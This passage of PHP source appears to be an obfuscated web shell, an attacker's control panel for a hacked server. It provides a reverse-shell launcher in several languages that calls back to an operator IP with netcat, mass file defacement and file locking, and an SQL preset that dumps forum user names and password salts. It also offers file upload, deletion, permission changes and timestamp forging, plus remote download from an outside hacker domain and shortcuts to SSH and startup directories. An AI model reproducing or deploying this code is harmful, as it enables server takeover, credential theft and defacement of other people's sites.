        echo '<option value="t00lsa \'discuzx25\' t00lsb \'pre_ucenter_members\' t00lsc \'username,used,salt,email\' t00lsfile \'' .
            THISDIR .
            'out.txt\';">Off the DB (MySql)</option>';
        echo "</select>";
        echo '</td><td><textarea name="sqlcode" id="sqlcode" style="width:680px;height:80px;">' .
            htmlspecialchars($sqlcode) .
            "</textarea></td></tr>";
        echo '<tr><td>Action</td><td><select name="names">';
        $charsets = [
            "gbk",
            "utf8",
            "big5",
            "latin1",
            "cp866",
            "ujis",
            "euckr",
            "koi8r",
            "koi8u",
        ];
        foreach ($charsets as $charset) {
            echo '<option value="' .
                $charset .
                '"' .
                ($names == $charset ? " selected" : "") .
                ">" .
                $charset .
                "</option>";
        }
        echo '</select> <input type="submit" style="width:80px;" value="Go"></td></tr>';
        echo "</table></form>";
        if ($rows) {
            echo '<pre style="padding:5px;background:#F8F8F8;text-align:left;">';
            ob_start();
            print_r($rows);
            $out = ob_get_contents();
            ob_end_clean();
            if (
                preg_match("~[\\x{4e00}-\\x{9fa5}]+~u", $out) &&
                OpLkJKqrTY("iconv")
            ) {
                $out = @iconv("UTF-8", "GB2312//IGNORE", $out);
            }
            echo htmlspecialchars($out);
            echo "</pre>";
        }
        break;
    case "massht":
        echo '<div class="msgbox">' . $msg . "</div>";
        echo '<form method="POST">';
        QiUyTbAgHk("ahh");
        echo '<input type="hidden" name="go" id="go" value="massht">';
        echo '<table class="tables"><tr><th style="width:15%;">Mass htcs</th><th>Path</th></tr>';
        echo '<tr><td>Prefix</td><td><input type="text" name="d_dir" style="width:268px;" value="' .
            getcwd() .
            '"> (Path to folder you wanna Mass htcs)</td></tr>';
        echo '</td></tr><tr><td>isi htcs</td><td><textarea style="width: 582px; height: 171px;" name="script"></textarea></td></tr>';
        echo '</td></tr><tr><td>Action</td><td><input type="submit" name="start" style="width:80px;" value="Mass!"></td></tr>';
        if (isset($_POST["start"])) {
            kkk();
        }
        echo "</table></form>";
        break;
    case "lockFile":
        echo '<div class="msgbox">' . $msg . "</div>";
        echo '<form method="POST">';
        QiUyTbAgHk("ahh");
        echo '<input type="hidden" name="go" id="go" value="lockFile">';
        echo '<table class="tables"><tr><th style="width:15%;">Lock File</th><th>Path</th></tr>';
        echo '<tr><td>File Name</td><td><input type="text" name="namafile" style="width:268px;" value="' .
            getcwd() .
            "/" .
            '"> (Path to file you wanna Lock)</td></tr>';
        echo '</td></tr><tr><td>Action</td><td><input type="submit" name="aww" style="width:80px;" value="Lock It!"></td></tr>';
        echo "</table></form>";
        if (isset($_POST["aww"])) {
            lockFile($_POST["namafile"]);
            $msg = "File Locked!";
        }
        break;
    case "backshell":
        if (!empty($_POST["backip"]) && !empty($_POST["backport"])) {
            $backip = $_POST["backip"];
            $backport = $_POST["backport"];
            $temp = $_POST["temp"] ? $_POST["temp"] : "/tmp";
            $type = $_POST["type"];
            $msg = backshell($backip, $backport, $temp, $type);
        } else {
            $backip = $_SERVER["REMOTE_ADDR"];
            $backport = "443";
            $temp = "/tmp";
            $type = "pl";
        }
        echo '<div class="msgbox">' . $msg . "</div>";
        echo '<form method="POST">';
        QiUyTbAgHk("ahh");
        echo '<input type="hidden" name="go" id="go" value="backshell">';
        echo '<table class="tables"><tr><th style="width:15%;">Name</th><th>Setup</th></tr>';
        echo '<tr><td>Bind address</td><td><input type="text" name="backip" style="width:268px;" value="' .
            $backip .
            '"> (Your ip)</td></tr>';
        echo '<tr><td>Bind port</td><td><input type="text" name="backport" style="width:268px;" value="' .
            $backport .
            '"> (nc -vvlp ' .
            $backport .
            ")</td></tr>";
        echo '<tr><td>Temporary directory</td><td><input type="text" name="temp" style="width:268px;" value="' .
            $temp .
            '"> (Only Linux)</td></tr>';
        echo "<tr><td>Rebound method</td><td>";
        $types = [
            "pl" => "Perl",
            "py" => "Python",
            "c" => "C-bin",
            "pcntl" => "Pcntl",
            "php" => "PHP",
            "phpwin" => "PHP-WS",
        ];
        foreach ($types as $key => $name) {
            echo '<label><input type="radio" name="type" value="' .
                $key .
                '"' .
                ($key == $type ? " checked" : "") .
                ">" .
                $name .
                "</label> ";
        }
        echo '</td></tr><tr><td>Action</td><td><input type="submit" style="width:80px;" value="Go"></td></tr>';
        echo "</table></form>";
        break;
    case "edit":
    case "editor":
        $file = AnIanYnsQ($_POST["godir"] . "/" . $_POST["govar"]);
        $iconv = OpLkJKqrTY("iconv");
        if (!OaQiLmKnH($file)) {
            $msg = "[Create new file]";
        } else {
            $code = filer($file);
            $chst = "Default";
            if (preg_match("~[\\x{4e00}-\\x{9fa5}]+~u", $code) && $iconv) {
                $chst = "utf-8";
                $code = @iconv("UTF-8", "GB2312//IGNORE", $code);
            }
            $size = size(filesize($file));
            $msg =
                "[File Permission: " .
                substr(decoct(fileperms($file)), -4) .
                "] [File size: " .
                $size .
                "] [File encoding: " .
                $chst .
                "]";
        }
        echo vcnvSCZgBz(
            "PHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdCI+DQp2YXIgbiA9IDA7DQpmdW5jdGlvbiBzZWFyY2goc3RyKSB7DQoJdmFyIHR4dCwgaSwgZm91bmQ7DQoJaWYoc3RyID09ICIiKSByZXR1cm4gZmFsc2U7DQoJdHh0ID0gJCgnZmlsZWNvZGUnKS5jcmVhdGVUZXh0UmFuZ2UoKTsNCglmb3IoaSA9IDA7IGkgPD0gbiAmJiAoZm91bmQgPSB0eHQuZmluZFRleHQoc3RyKSkgIT0gZmFsc2U7IGkrKyl7DQoJCXR4dC5tb3ZlU3RhcnQoImNoYXJhY3RlciIsIDEpOw0KCQl0eHQubW92ZUVuZCgidGV4dGVkaXQiKTsNCgl9DQoJaWYoZm91bmQpeyB0eHQubW92ZVN0YXJ0KCJjaGFyYWN0ZXIiLCAtMSk7IHR4dC5maW5kVGV4dChzdHIpOyB0eHQuc2VsZWN0KCk7IHR4dC5zY3JvbGxJbnRvVmlldygpOyBuKys7IH0NCgllbHNlIHsgaWYgKG4gPiAwKSB7IG4gPSAwOyBzZWFyY2goc3RyKTsgfSBlbHNlIGFsZXJ0KHN0ciArICIuLi4gTm90LUZpbmQiKTsgfQ0KCXJldHVybiBmYWxzZTsNCn0NCjwvc2NyaXB0Pg=="
        );
        echo '<div class="msgbox"><input name="keyword" id="keyword" type="text" style="width:138px;height:15px;"><input type="button" value="Find content" onclick="search($(\'keyword\').value);"> - ' .
            $msg .
            "</div>";
        echo '<form name="editfrm" id="editfrm" method="POST">';
        QiUyTbAgHk("ahh");
        echo '<input type="hidden" name="go" value=""><input type="hidden" name="act" id="act" value="edit">';
        echo '<input type="hidden" name="dir" id="dir" value="' .
            dirname($file) .
            '">';
        echo '<div class="actall">File <input type="text" name="filename" value="' .
            $file .
            '" style="width:528px;"> ';
        if ($iconv) {
            echo 'Coding <select name="tostr">';
            $selects = ["normal" => "Default", "utf" => "utf-8"];
            foreach ($selects as $var => $name) {
                echo '<option value="' .
                    $var .
                    '"' .
                    ($name == $chst ? " selected" : "") .
                    ">" .
                    $name .
                    "</option>";
            }
            echo "</select>";
        }
        echo '</div><div class="actall"><textarea name="filecode" id="filecode" style="width:698px;height:358px;">' .
            htmlspecialchars($code) .
            "</textarea></div></form>";
        echo '<div class="actall" style="padding:5px;padding-right:68px;"><input type="button" onclick="$(\'editfrm\').submit();" value="Save" style="width:80px;"> ';
        echo '<form name="backfrm" id="backfrm" method="POST"><input type="hidden" name="go" value=""><input type="hidden" name="dir" id="dir" value="' .
            dirname($file) .
            '">';
        QiUyTbAgHk("ahh");
        echo '<input type="button" onclick="$(\'backfrm\').submit();" value="Back" style="width:80px;"></form></div>';
        break;
    case "upfiles":
        $updir = isset($_POST["updir"]) ? $_POST["updir"] : $_POST["godir"];
        $msg =
            "[Maximum upload file " .
            LkQrTgBm("upload_max_filesize") .
            "] [POST maximum submitted data " .
            LkQrTgBm("post_max_size") .
            "]";
        $max = 10;
        if (isset($_FILES["uploads"]) && isset($_POST["renames"])) {
            $uploads = $_FILES["uploads"];
            $msgs = [];
            for ($i = 1; $i < $max; $i++) {
                if ($uploads["error"][$i] == UPLOAD_ERR_OK) {
                    $rename =
                        $_POST["renames"][$i] == ""
                            ? $uploads["name"][$i]
                            : $_POST["renames"][$i];
                    $filea = $uploads["tmp_name"][$i];
                    $fileb = AnIanYnsQ($updir . "/" . $rename);
                    $msgs[$i] = fileu($filea, $fileb)
                        ? "<br><h2>Uploaded successfully " . $rename . "</h2>"
                        : "<br><h1>Upload failed " . $rename . "</h1>";
                }
            }
        }
        echo '<div class="msgbox">' . $msg . "</div>";
        echo '<form name="upsfrm" id="upsfrm" method="POST" enctype="multipart/form-data">';
        QiUyTbAgHk("ahh");
        echo '<input type="hidden" name="go" value="upfiles"><input type="hidden" name="act" id="act" value="upload">';
        echo '<div class="actall"><p>Upload to directory <input type="text" name="updir" style="width:398px;" value="' .
            $updir .
            '"></p>';
        for ($i = 1; $i < $max; $i++) {
            echo "<p>File" .
                $i .
                ' <input type="file" name="uploads[' .
                $i .
                ']" style="width:300px;"> Rename <input type="text" name="renames[' .
                $i .
                ']" style="width:128px;"> ' .
                $msgs[$i] .
                "</p>";
        }
        echo '</div></form><div class="actall" style="padding:8px;padding-right:68px;"><input type="button" onclick="$(\'upsfrm\').submit();" value="Upload" style="width:80px;"> ';
        echo '<form name="backfrm" id="backfrm" method="POST"><input type="hidden" name="go" value=""><input type="hidden" name="dir" id="dir" value="' .
            $updir .
            '">';
        QiUyTbAgHk("ahh");
        echo '<input type="button" onclick="$(\'backfrm\').submit();" value="Back" style="width:80px;"></form></div>';
        break;
    default:
        if (isset($_FILES["upfile"])) {
            if ($_FILES["upfile"]["name"] == "") {
                $msg = "<h1>Please select file</h1>";
            } else {
                $rename =
                    $_POST["rename"] == ""
                        ? $_FILES["upfile"]["name"]
                        : $_POST["rename"];
                $filea = $_FILES["upfile"]["tmp_name"];
                $fileb = AnIanYnsQ($nowdir . $rename);
                $msg = fileu($filea, $fileb)
                    ? "<h2>Upload files " . $rename . " Success</h2>"
                    : "<h1>Upload files " . $rename . " Failure</h1>";
            }
        }
        if (isset($_POST["act"])) {
            switch ($_POST["act"]) {
                case "a":
                    if (!$_POST["files"]) {
                        $msg =
                            "<h1>Please select file " . $_POST["var"] . "</h1>";
                    } else {
                        $i = 0;
                        foreach ($_POST["files"] as $filename) {
                            $i += @copy(
                                AnIanYnsQ($nowdir . $filename),
                                AnIanYnsQ($_POST["var"] . "/" . $filename)
                            )
                                ? 1
                                : 0;
                        }
                        $msg = $msg = $i
                            ? "<h2>Co-copy " .
                                $i .
                                " Files to" .
                                $_POST["var"] .
                                "Success</h2>"
                            : "<h1>Co-copy " .
                                $i .
                                " Files to" .
                                $_POST["var"] .
                                "Failure</h1>";
                    }
                    break;
                case "b":
                    if (!$_POST["files"]) {
                        $msg = "<h1>Please select file</h1>";
                    } else {
                        $i = 0;
                        foreach ($_POST["files"] as $filename) {
                            $i += @unlink(AnIanYnsQ($nowdir . $filename)) ? 1 : 0;
                        }
                        $msg = $i
                            ? "<h2>Altogether deleted! " .
                                $i .
                                " Files succeeded</h2>"
                            : "<h1>Altogether deleted! " .
                                $i .
                                " Files failed</h1>";
                    }
                    break;
                case "c":
                    if (!$_POST["files"]) {
                        $msg =
                            "<h1>Please select file " . $_POST["var"] . "</h1>";
                    } elseif (!ereg("^[0-7]{4}\$", $_POST["var"])) {
                        $msg = "<h1>Permision value error</h1>";
                    } else {
                        $i = 0;
                        foreach ($_POST["files"] as $filename) {
                            $i += @chmod(
                                AnIanYnsQ($nowdir . $filename),
                                base_convert($_POST["var"], 8, 10)
                            )
                                ? 1
                                : 0;
                        }
                        $msg = $i
                            ? "<h2>Total " .
                                $i .
                                " File modification permission are" .
                                $_POST["var"] .
                                "Success</h2>"
                            : "<h1>Total " .
                                $i .
                                " File modification permission are" .
                                $_POST["var"] .
                                "Failure</h1>";
                    }
                    break;
                case "d":
                    if (!$_POST["files"]) {
                        $msg =
                            "<h1>Please select file " . $_POST["var"] . "</h1>";
                    } elseif (
                        !preg_match(
                            "/(\\d+)-(\\d+)-(\\d+) (\\d+):(\\d+):(\\d+)/",
                            $_POST["var"]
                        )
                    ) {
                        $msg =
                            "<h1>Wrong time format " . $_POST["var"] . "</h1>";
                    } else {
                        $i = 0;
                        foreach ($_POST["files"] as $filename) {
                            $i += @touch(
                                AnIanYnsQ($nowdir . $filename),
                                strtotime($_POST["var"])
                            )
                                ? 1
                                : 0;
                        }
                        $msg = $i
                            ? "<h2>Total " .
                                $i .
                                " Files modified at" .
                                $_POST["var"] .
                                "Success</h2>"
                            : "<h1>Total " .
                                $i .
                                " Files modified at" .
                                $_POST["var"] .
                                "Failure</h1>";
                    }
                    break;
                case "e":
                    $path = AnIanYnsQ($nowdir . $_POST["var"] . "/");
                    if (OaQiLmKnH($path)) {
                        $msg =
                            "<h1>Directory already exists " .
                            $_POST["var"] .
                            "</h1>";
                    } else {
                        $msg = @mkdir($path, 0777)
                            ? "<h2>Create a directory " .
                                $_POST["var"] .
                                " Success</h2>"
                            : "<h1>Create a directory " .
                                $_POST["var"] .
                                " Failure</h1>";
                    }
                    break;
                case "f":
                    $context = ["http" => ["timeout" => 30]];
                    if (OpLkJKqrTY("stream_context_create")) {
                        $stream = stream_context_create($context);
                    }
                    $data = @file_get_contents($_POST["var"], false, $stream);
                    $filename = array_pop(explode("/", $_POST["var"]));
                    if ($data) {
                        $msg = filew(AnIanYnsQ($nowdir . $filename), $data, "wb")
                            ? "<h2>Download " . $filename . " Success</h2>"
                            : "<h1>Download " . $filename . " Failure</h1>";
                    } else {
                        $msg =
                            "<h1>Download failed or download is not supported</h1>";
                    }
                    break;
                case "rf":
                    $files = explode("|x|", $_POST["var"]);
                    if (count($files) != 2) {
                        $msg = "<h1>Input error</h1>";
                    } else {
                        $msg = @rename(
                            AnIanYnsQ($nowdir . $files[1]),
                            AnIanYnsQ($nowdir . $files[0])
                        )
                            ? "<h2>Rename " .
                                $files[1] .
                                " for " .
                                $files[0] .
                                " Success</h2>"
                            : "<h1>Rename " .
                                $files[1] .
                                " for " .
                                $files[0] .
                                " Failure</h1>";
                    }
                    break;
                case "pd":
                    $files = explode("|x|", $_POST["var"]);
                    if (count($files) != 2) {
                        $msg = "<h1>Input error</h1>";
                    } else {
                        $path = AnIanYnsQ($nowdir . $files[1]);
                        $msg = @chmod($path, base_convert($files[0], 8, 10))
                            ? "<h2>Modify" .
                                $files[1] .
                                "Permission is" .
                                $files[0] .
                                "Success</h2>"
                            : "<h1>Modify" .
                                $files[1] .
                                "Permission is" .
                                $files[0] .
                                "Failure</h1>";
                    }
                    break;
                case "edit":
                    if (
                        isset($_POST["filename"]) &&
                        isset($_POST["filecode"])
                    ) {
                        if ($_POST["tostr"] == "utf") {
                            $_POST["filecode"] = @iconv(
                                "GB2312//IGNORE",
                                "UTF-8",
                                $_POST["filecode"]
                            );
                        }
                        $msg = filew(
                            $_POST["filename"],
                            $_POST["filecode"],
                            "w"
                        )
                            ? "<h2>Saved successfully " .
                                $_POST["filename"] .
                                "</h2>"
                            : "<h1>Save failed " . $_POST["filename"] . "</h1>";
                    }
                    break;
                case "deltree":
                    $deldir = AnIanYnsQ($nowdir . $_POST["var"] . "/");
                    if (!OaQiLmKnH($deldir)) {
                        $msg =
                            "<h1>Total dir " .
                            $_POST["var"] .
                            " does not exist</h1>";
                    } else {
                        $msg = deltree($deldir)
                            ? "<h2>Delete directory " .
                                $_POST["var"] .
                                " Success</h2>"
                            : "<h1>Delete directory " .
                                $_POST["var"] .
                                " failure</h1>";
                    }
                    break;
            }
        }
        $chmod = substr(decoct(fileperms($nowdir)), -4);
        if (!$chmod) {
            $msg .= " - <h1>Cannot read directory</h1>";
        }
        $array = showdir($nowdir);
        $thisurl = AnIanYnsQ("/" . strtr($nowdir, [ROOTDIR => ""]) . "/");
        $nowdir = strtr($nowdir, ['\'' => "%27", '"' => "%22"]);
        echo '<div class="msgbox">' . $msg . "</div>";
        echo '<div class="actall"><form name="frm" id="frm" method="POST">';
        QiUyTbAgHk("ahh");
        echo (is_writable($nowdir) ? "<h2>Path</h2>" : "<h1>Path</h1>") .
            ' <input type="text" name="dir" id="dir" style="width:508px;" value="' .
            AnIanYnsQ($nowdir . "/") .
            '"> ';
        echo '<input type="button" onclick="$(\'frm\').submit();" style="width:50px;" value="Go"> ';
        echo '<input type="button" onclick="cd(\'' .
            ROOTDIR .
            '\');" style="width:68px;" value="Root dir"> ';
        echo '<input type="button" onclick="cd(\'' .
            THISDIR .
            '\');" style="width:68px;" value="Current dir"> ';
        echo '<select onchange="cd(options[selectedIndex].value);">';
        echo "<option>---Special Dir---</option>";
        echo '<option value="C:/RECYCLER/">Win-RECYCLER</option>';
        echo '<option value="C:/$Recycle.Bin/">Win-$Recycle</option>';
        echo '<option value="C:/Program Files/">Win-Program</option>';
        echo '<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup/">Win-Startup</option>';
        echo '<option value="C:/Documents and Settings/All Users/">Win-Startup (CN)</option>';
        echo '<option value="C:/Windows/Temp/">Win-TEMP</option>';
        echo '<option value="/usr/local/">Linux-local</option>';
        echo '<option value="/tmp/">Linux-tmp</option>';
        echo '<option value="/var/tmp/">Linux-var</option>';
        echo '<option value="/etc/ssh/">Linux-ssh</option>';
        echo '</select></form></div><div class="actall">';
        echo '<input type="button" value="New file" onclick="nf(\'edit\',\'newfile.php\');" style="width:68px;"> ';
        echo '<input type="button" value="New Dir" onclick="txts(\'Directory name\',\'newdir\',\'e\');" style="width:68px;"> ';
        echo '<input type="button" value="Download" onclick="txts(\'Download the file to the current directory\',\'http://hax.or.id/indo.txt\',\'f\');" style="width:68px;"> ';
        echo '<input type="button" value="Bulk Up" onclick="go(\'upfiles\',\'' .
            $nowdir .
            '\');" style="width:68px;"> ';
        echo '<form name="upfrm" id="upfrm" method="POST" enctype="multipart/form-data">';
        QiUyTbAgHk("ahh");
        echo '<input type="hidden" name="dir" id="dir" value="' .
            $nowdir .
            '">';
        echo '<input type="file" name="upfile" style="width:286px;height:21px;"> ';
        echo '<input type="button" onclick="$(\'upfrm\').submit();" value="Upload" style="width:50px;"> ';
        echo 'Renamed to <input type="text" name="rename" style="width:128px;">';
        echo "</form></div>";
        echo '<form name="frm1" id="frm1" method="POST"><table class="tables">';
        QiUyTbAgHk("ahh");
        echo '<input type="hidden" name="dir" id="dir" value="' .
            $nowdir .
            '">';
        echo '<input type="hidden" name="act" id="act" value="">';
        echo '<input type="hidden" name="var" id="var" value="">';
        echo '<th><a href="javascript:void(0);" onclick="cd(\'' .
            dirname($nowdir) .
            '/\');">Parent directory</a></th><th style="width:8%">Action</th><th style="width:5%">Perm</th><th style="width:17%">Creation time</th><th style="width:17%">Last Changed</th><th style="width:8%">Size</th>';
        if ($array) {
            asort($array);
            asort($array);
            $dnum = $fnum = 0;
            foreach ($array["dir"] as $path => $name) {
                $prem = substr(decoct(fileperms($path)), -4);
                $ctime = date("Y-m-d H:i:s", filectime($path));
                $mtime = date("Y-m-d H:i:s", filemtime($path));
                echo "<tr>";
                echo '<td><a href="javascript:void(0);" onclick="cd(\'' .
                    $nowdir .
                    $name .
                    '\');"><b>' .
                    strtr($name, ["%27" => '\'', "%22" => '"']) .
                    "</b></a></td>";
                echo '<td><a href="javascript:void(0);" onclick="dels(\'' .
                    $name .
                    '\');">Del</a> ';
                echo '  <a href="javascript:void(0);" onclick="acts(\'' .
                    $name .
                    '\',\'rf\',\'' .
                    $name .
                    '\');">Ren</a></td>';
                echo '<td><a href="javascript:void(0);" onclick="acts(\'' .
                    $prem .
                    '\',\'pd\',\'' .
                    $name .
                    '\');">' .
                    $prem .
                    "</a></td>";
                echo "<td>" . $ctime . "</td>";
                echo "<td>" . $mtime . "</td>";
                echo "<td>-</td>";
                echo "</tr>";
                $dnum++;
            }
            foreach ($array["file"] as $path => $name) {
                $prem = substr(decoct(fileperms($path)), -4);
                $ctime = date("Y-m-d H:i:s", filectime($path));
                $mtime = date("Y-m-d H:i:s", filemtime($path));
                $size = size(filesize($path));
                echo "<tr>";
                echo '<td><input type="checkbox" name="files[]" value="' .
                    $name .
                    '"><a href="javascript:void(0);" onclick="go(\'edit\',\'' .
                    $name .
                    '\');">' .
                    strtr($name, ["%27" => '\'', "%22" => '"']) .
                    "</a></td>";
                echo '<td><a target="_blank" href="' .
                    $thisurl .
                    $name .
                    '">View</a> ';
                echo '  <a href="javascript:void(0);" onclick="acts(\'' .
                    $name .
                    '\',\'rf\',\'' .
                    $name .
                    '\');">Ren</a></td>';
                echo '<td><a href="javascript:void(0);" onclick="acts(\'' .
                    $prem .
                    '\',\'pd\',\'' .
                    $name .
                    '\');">' .
                    $prem .
                    "</a></td>";
                echo "<td>" . $ctime . "</td>";
                echo "<td>" . $mtime . "</td>";
                echo '<td align="right"><a href="javascript:void(0);" onclick="go(\'down\',\'' .
                    $name .
                    '\');">' .
                    $size .
                    "</a></td>";
                echo "</tr>";
                $fnum++;
            }
        }
        unset($array);
        echo "</table>";
        echo '<div class="actall" style="text-align:left;">';
        echo '<input type="checkbox" id="chkall" name="chkall" value="on" onclick="sa(this.form);"> ';
        echo '<input type="button" value="Copy" style="width:50px;" onclick=\'txts("Copy path","' .
            $nowdir .
            '","a");\'> ';
        echo '<input type="button" value="Delete" style="width:50px;" onclick=\'dels("b");\'> ';
        echo '<input type="button" value="Perm" style="width:50px;" onclick=\'txts("Change Permission","0666","c");\'> ';
        echo '<input type="button" value="Time" style="width:50px;" onclick=\'txts("Change the time","' .
            $mtime .
            '","d");\'> ';
        echo "Total dir[" .
            $dnum .
            "] - Total file[" .
            $fnum .
            "] - Permission[" .
            $chmod .
            "]</div></form>";
        break;
}
?>
<div class="footag"><?=php_uname() .
    "<br>" .
    $_SERVER["SERVER_SOFTWARE"] .
    "<br><blink>kamu kuat | kamu hebat | kamu pasti admin judi</blink></div></div></div></body></html>"; 

}
}
$bec__Y = new Pukimak("Santai Dulu Gak Sih", "Yoi mas bro");
$bec__Y->execute();;
